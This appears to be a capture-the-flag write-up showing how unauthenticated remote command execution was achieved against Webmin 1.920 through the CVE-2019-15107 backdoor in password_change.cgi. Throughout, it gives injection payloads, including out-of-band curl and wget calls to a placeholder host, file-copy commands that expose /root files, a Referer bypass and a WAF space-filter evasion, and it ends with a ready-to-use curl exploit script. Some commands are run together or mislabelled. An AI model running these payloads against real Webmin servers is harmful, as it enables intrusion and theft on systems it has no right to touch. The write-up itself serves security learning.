# CVE-2019-15107 — Webmin Pre-Auth RCE

### 

### Version Identification In Security Warning

The login page revealed:

- Webmin 1.920

- Ubuntu Linux 20.04.6

### Identify

- After identifying the version, we investigated CVE-2019-15107 and found that it involved a backdoor in Webmin's password change functionality

### Understanding the Vulnerability

The vulnerable code in `password_change.cgi` contained the following expression:

```perl
$enc eq $wuser->{'pass'} ||
&pass_error($text{'password_eold'}, qx/$in{'old'}/);
```

The `qx//` operator executes a system command and captures its output. The vulnerable code passes the user-controlled `old` parameter to this operator.

This allowed command execution without authentication.

### Bypass Referer Header

Our initial requests encountered a Webmin Security Warning when using the `Referer` header.

```bash
Security Warning page
```

1. change the Referer header to : 

```bash
Referer: https://5ccedc5587.0o8.ir/session_login.cgi
```

2. remove Referer header : Bypass 

```bash
--referer ""
```

##### 1. First Payload

```bash
data = {
    'user': 'root',
    'pam': '0', 
    'expired': '2',
    'old': 'test|id',
    'new1': 'x',
    'new2': 'x'
}
```

```bash
Failed to change password : The current password is incorrect
```

##### 2. Blind RCE With sleep Executed

```python
'old': 'test|sleep 5'
```

##### 3.  Failed Attempts to Retrieve Command Output

##### 4. Out-of-Band (OOB) Testing

```python
'old': 'test|curl http://<OAST_URL>/'
'old': 'test|nslookup <OAST_URL>'
'old': 'test|wget http://<OAST_URL>/'
```

outbound traffic  have blocked 

##### 5. tried to write the output to a file that could be read via the web

```bash
cat /root/flag.txt > /usr/share/webmin/unauthenticated/pwn.txt
```

The file was written, but upon reading it, the Authentic Theme routed all requests through CGI, resulting in 404 errors

```bash
cat /root/flag.txt > /usr/share/webmin/unauthenticated/pwn.js
```

The same problem again — the theme was intercepting everything

##### 6. Finding the Webmin Root Directory  (`miniserv.conf`)

```bash
WROOT=$(grep "^root=" /etc/webmin/miniserv.conf | cut -d= -f2) &&cat /root/flag.txt > ${WROOT}/images/flag.js
```

We sent a GET request to` /images/flag.js`, but it still performed a theme redirect.

##### 7. Python HTTP server on target

```bash
python3 -m http.server 8888 --directory /root/ &    
```

Then we sent request to port 8888 — but Cloudflare was routing all ports to Webmin.

##### 8.  Changing the Linux Root Password

We tried to change root password and logging in with the new password, but Webmin uses its own authentication mechanism, not the Linux password.

### Finding  The Correct Execution Path — Empty `pam`

After several unsuccessful attempts, we reviewed the original request parameters and identified an important mistake: we had been using `pam=0`.

The correct request required an empty `pam` value

This was the key change that allowed us to retrieve command output directly instead of relying on Blind RCE techniques.

##### Bypassing the Space Filter

The WAF blocked normal spaces in commands:

- `cat /root/flag` — Blocked

- `cat${IFS}/root/flag` — Worked

##### Finding and Reading the Flag

First, we listed `/root/` and found that the file was named `flag`  .

```
ls${IFS}/root/cat${IFS}/root/flag
```

### Final Result

The command output was returned successfully, flag :

```
spara{fd0946c2508114416bb4764633c63e0e}
```

### Final Explotation Script

```python
curl -ks "https://5ccedc5587.0o8.ir/password_change.cgi" \
  -d 'user=rootxx&pam=&expired=2&old=test|<COMMAND>&new1=test2&new2=test2' \
  -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1' \
  --referer "" \
  | python3 -c "
import sys
from html.parser import HTMLParser
class P(HTMLParser):
    def handle_data(self,d):
        d=d.strip()
        if d and len(d)<300 and 'theme_' not in d and 'settings_' not in d:
            print(d)
P().feed(sys.stdin.read())
"
```
